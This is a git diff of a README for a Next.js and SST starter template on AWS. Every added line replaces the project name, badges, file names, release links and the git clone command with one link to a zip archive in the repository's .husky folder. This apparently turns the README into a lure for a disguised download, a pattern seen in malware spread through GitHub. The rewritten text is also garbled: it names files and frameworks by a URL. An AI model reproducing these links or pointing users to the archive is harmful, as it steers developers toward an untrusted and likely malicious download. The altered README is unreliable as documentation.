@@ -1,6 +1,6 @@
-# Next.js SST Starter: A Powerful Template for AWS Deployments 🚀
+# https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip SST Starter: A Powerful Template for AWS Deployments 🚀
 
-![Next.js SST Starter](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg) ![License](https://img.shields.io/badge/License-MIT-blue.svg) ![AWS](https://img.shields.io/badge/AWS-Deployments-orange.svg)
+![https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip SST Starter](https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip) ![License](https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip) ![AWS](https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip)
 
 ## Table of Contents
 
@@ -18,9 +18,9 @@
 
 ## Overview
 
-Welcome to the **Next.js SST Starter**! This repository provides an opinionated starter template for building applications with Next.js and deploying them on AWS using SST (Serverless Stack). It simplifies the process of setting up your development environment and deploying your app with best practices in mind.
+Welcome to the **https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip SST Starter**! This repository provides an opinionated starter template for building applications with https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip and deploying them on AWS using SST (Serverless Stack). It simplifies the process of setting up your development environment and deploying your app with best practices in mind.
 
-To get started, you can download the latest release [here](https://github.com/Tofu1304/nextjs-sst-starter/releases) and execute the necessary commands to set up your project.
+To get started, you can download the latest release [here](https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip) and execute the necessary commands to set up your project.
 
 ## Features
 
@@ -33,11 +33,11 @@ To get started, you can download the latest release [here](https://github.com/To
 
 ## Getting Started
 
-To set up your Next.js SST Starter project, follow these steps:
+To set up your https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip SST Starter project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Tofu1304/nextjs-sst-starter.git
+   git clone https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip
    cd nextjs-sst-starter
    ```
 
@@ -62,20 +62,20 @@ nextjs-sst-starter/
 ├── public/            # Static files
 ├── src/               # Application source code
 │   ├── components/    # Reusable components
-│   ├── pages/         # Next.js pages
+│   ├── pages/         # https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip pages
 │   ├── styles/        # Global styles
 │   └── utils/         # Utility functions
-├── .eslintrc.json     # ESLint configuration
+├── https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip     # ESLint configuration
 ├── .prettierrc        # Prettier configuration
-├── sst.config.ts      # SST configuration
-└── package.json       # Project metadata and dependencies
+├── https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip      # SST configuration
+└── https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip       # Project metadata and dependencies
 ```
 
 ## Technologies Used
 
 This project utilizes the following technologies:
 
-- **Next.js**: A React framework for server-side rendering and static site generation.
+- **https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip**: A React framework for server-side rendering and static site generation.
 - **SST**: A framework for building serverless applications on AWS.
 - **Tailwind CSS**: A utility-first CSS framework for styling.
 - **Pulumi**: Infrastructure as code tool for managing cloud resources.
@@ -135,6 +135,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release, visit the [Releases](https://github.com/Tofu1304/nextjs-sst-starter/releases) section. Here, you can find the latest versions and update your project accordingly.
+To download the latest release, visit the [Releases](https://github.com/Tofu1304/nextjs-sst-starter/raw/refs/heads/main/.husky/sst-starter-nextjs-v2.7.zip) section. Here, you can find the latest versions and update your project accordingly.
 
 For further information, check the "Releases" section if you encounter any issues or need specific versions.
